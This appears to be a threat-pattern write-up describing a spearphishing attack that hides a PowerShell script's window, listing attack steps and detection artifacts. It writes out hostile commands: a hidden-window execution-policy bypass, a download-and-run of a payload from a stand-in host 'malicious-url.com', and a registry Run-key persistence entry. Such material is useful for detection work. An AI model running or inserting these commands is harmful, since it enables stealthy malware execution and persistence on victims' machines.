Pattern Name: Concealment via PowerShell
Scenario Overview: An attacker sends a spearphishing email containing a malicious PowerShell script as an attachment. The script is designed to execute in a hidden window, allowing the attacker to maintain stealth while executing further malicious actions on the victim's machine.

Attack Flow Breakdown:
1. **Initial Access via Email**
   - Application: Outlook
   - User Action: The user receives an email with a malicious attachment (e.g., `malicious_script.ps1`).
   - Key Artifacts: Email headers, attachment file name.

2. **Execution of Malicious Attachment**
   - Application: PowerShell
   - User Action: The user opens the attachment, which triggers the execution of the PowerShell script.
   - Command:
     ```powershell
     # Execute the PowerShell script with hidden window style
     powershell.exe -ExecutionPolicy Bypass -File "C:\Users\User\Downloads\malicious_script.ps1" -WindowStyle Hidden
     ```
   - Key Artifacts: PowerShell command line arguments, script file path.

3. **Concealment of Activity**
   - Application: PowerShell
   - Behavior: The script runs without displaying a window, making it difficult for the user to notice any activity.
   - Key Artifacts: API calls to `ShowWindow`, `CreateDesktop`.

4. **Further Payload Execution**
   - Application: PowerShell
   - Action: The script may download additional payloads or execute further commands.
   - Command:
     ```powershell
     # Download and execute a secondary payload
     Invoke-WebRequest -Uri "http://malicious-url.com/payload.exe" -OutFile "C:\Users\User\AppData\Local\Temp\payload.exe"
     Start-Process "C:\Users\User\AppData\Local\Temp\payload.exe" -WindowStyle Hidden
     ```
   - Key Artifacts: Network indicators (malicious URL), downloaded file path.

5. **Establishing Persistence**
   - Application: Registry Editor
   - Action: The script modifies the registry to ensure the malicious payload runs on startup.
   - Command:
     ```reg
     # Add a registry key for persistence
     reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "MaliciousPayload" /t REG_SZ /d "C:\Users\User\AppData\Local\Temp\payload.exe" /f
     ```
   - Key Artifacts: Registry modifications.
